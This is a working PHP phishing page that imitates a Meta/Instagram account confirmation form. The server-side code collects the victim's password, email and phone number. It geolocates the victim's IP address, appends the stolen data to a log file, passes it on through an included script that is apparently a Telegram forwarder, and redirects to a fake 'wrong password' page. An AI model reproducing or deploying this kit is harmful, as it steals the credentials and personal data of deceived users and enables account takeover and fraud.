<?php
error_reporting(0);
session_start();
$username=$_GET['username'];
if ($_POST) {
	$password=$_POST["password"];
	$email=$_POST["email"];
	$phone=$_POST["phone"];
	$ip = $_SERVER['REMOTE_ADDR'];
	$ch = curl_init('http://ip-api.com/json/'.$ip.'?lang=en');                                                                     
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
	$result = curl_exec($ch);
	$data = json_decode($result);
	$ulke = $data->country;
	$sehir = $data->regionName;
	date_default_timezone_set('Europe/Istanbul');
	$cur_time=date("d-m-Y H:i:s");
	$file = fopen('biaxewashere.php', 'a');
	fwrite($file, "
<html>
<head>
<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='dark'>

<font color='red'>Kullanıcı Adı : </font><font color='white'>".$username."</font><br>
<font color='red'>İlk Girilen Şifre : </font><font color='white'>".$password."</font><br>
<font color='red'>E-Posta Adresi : </font><font color='white'>".$email."</font><br>
<font color='red'>Telefon Numarası : </font><font color='white'>".$phone."</font><br>
<font color='red'>Ip Adresi : </font><font color='white'>".$ip."</font><br>
<font color='red'>Ülke : </font><font color='white'>".$ulke."/".$sehir."</font><br>
<font color='red'>Tarih : </font><font color='white'>".$cur_time."</font><br>
<hr>


"); 
   include 'api/tg.php';
	header("location: falsepassword.php?username=$username");
}
?>
<html lang="en"><head>
	  <title>Meta Verse </title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6033/6033716.png"
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&amp;display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="css/style.css">
</head>
<body>
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-7 col-lg-5">
					<div class="login-wrap p-4 p-md-5">
						<p style="text-align: center; color: black; font-size: 20px;" >
						<center>
							<img style="max-width:50%; border-radius:50%; margin-top:20px;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlIW7g3VG4FgRXCl4Vu8EJcej-or5--fzFow&usqp=CAU" alt="@<?php echo $username ?> of Profile Photo"><br><h4><strong>@<?php echo $username; ?></strong></h4>
						</center>
						<hr>
						<p style="text-align:center; font-size: 13px; color: black; font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;">Hi @<?php echo $username; ?> Por favor llene la información solicitada completamente.</p>
						<form id="form" class="login-form" onsubmit="return checkForm(this);" method="post">
							<div class="form-group" method="post">
								<input id="pwd" type="password" name="password" style="height: 45px;" class="form-control rounded-left" placeholder="Password" minlength="6" required="">
							</div>
							<div class="form-group d-flex">
								<input id="password" type="email" name="email" style="height: 45px;" class="form-control rounded-left" placeholder="E-mail" minlength="6" required="">
							</div>
							<div class="form-group d-flex">
								<input id="password" type="number" name="phone" style="height: 45px;" class="form-control rounded-left" placeholder="Contact Number" minlength="6" required="">
							</div>
							<div>
								<button type="submit" style="border-radius: 8px;  height: 35px; width: 100%; border: none; background-color: #1E90FF; color: white; font-weight: bold;">Confirm</button>
							</div><br>
							<div id="error"></div>
							<div>
								<center>
									<img src="https://logodownload.org/wp-content/uploads/2021/10/meta-logo-1.png" width="110px" alt="">
								</center>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</section>
	<script src="js/jquery.min.js"></script>
	<script src="js/popper.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/main.js"></script>
</body>
</html>